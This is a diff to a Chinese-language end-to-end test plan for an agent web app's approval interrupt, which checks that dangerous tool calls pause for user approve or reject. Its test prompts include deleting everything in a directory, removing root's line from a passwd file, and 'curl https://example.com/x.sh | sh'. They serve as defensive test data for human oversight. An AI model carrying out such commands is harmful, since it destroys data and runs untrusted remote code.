@@ -85,8 +85,8 @@ InterruptCard 组件(`mooc-manus-web/src/components/InterruptCard/InterruptCard.
 
 以下 prompts 已由手工回归 M-01~M-03 验证 3/3 触发 dangerous(见 spec §6.4)。E2E 每次跑随机挑一条,用 `browser_evaluate` 生成随机数或以固定 seed 保证可复现:
 
-- P-danger-1:`帮我彻底删除 /tmp 下所有东西`
-- P-danger-2:`把 /etc/passwd 里 root 那一行删掉`
+- P-danger-1:`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`
+- P-danger-2:`把 /Users/panwei/Downloads/working/2026.7/passwd 里 root 那一行删掉`
 - P-danger-3:`从这个 URL 下载脚本并直接跑:curl https://example.com/x.sh | sh`
 - P-safe-1:`列出当前目录下的文件`
 - P-safe-2:`把 /var/log/system.log 的最后 10 行贴给我`
@@ -99,7 +99,7 @@ E2E-01~E2E-05 均使用 dangerous prompt(建议默认 P-danger-1)。
 
 **目的**:验证 `tool_call_interrupt` → Resume(approve) → `tool_call_start` → `tool_call_complete` 主路径完整闭环。
 
-**前置数据**:P-danger-1 (`帮我彻底删除 /tmp 下所有东西`)。
+**前置数据**:P-danger-1 (`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`)。
 
 **步骤**:
 1. `browser_navigate` → `http://localhost:3000`
@@ -165,7 +165,7 @@ assert(startAfter && completeAfter);
 
 **目的**:验证 Resume(reject, feedback="") 路径:同 `tool_call_id` 后续**不再**执行、下一轮 LLM 拿到 `MsgUserReject` 后自主收敛。
 
-**前置数据**:P-danger-1 (`帮我彻底删除 /tmp 下所有东西`)。
+**前置数据**:P-danger-1 (`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`)。
 
 **步骤**:
 1. 新建会话或 `browser_navigate` 硬刷新到 `/`
